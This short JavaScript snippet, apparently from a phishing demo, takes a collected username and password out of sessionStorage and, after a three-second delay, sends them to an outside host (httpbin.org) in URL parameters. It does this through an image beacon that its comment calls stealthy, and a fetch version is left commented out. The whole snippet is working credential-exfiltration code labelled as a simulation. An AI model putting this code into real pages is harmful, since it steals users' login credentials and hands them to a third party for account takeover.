// Simulate exfil after 3 seconds (delayed)
setTimeout(() => {
  const u = sessionStorage.getItem('collected_username');
  const p = sessionStorage.getItem('collected_password');

  if (u && p) {
    const exfilURL = `https://httpbin.org/get?user=${encodeURIComponent(u)}&pass=${encodeURIComponent(p)}`;

    // Method 1: Using image beacon (stealthy)
    const img = new Image();
    img.src = exfilURL;

    // Method 2: Fetch (less stealthy, but useful for demo)
    /*
    fetch(exfilURL).then(resp => resp.json()).then(data => {
      console.log('Exfiltrated to:', exfilURL);
    });
    */
  }
}, 3000);
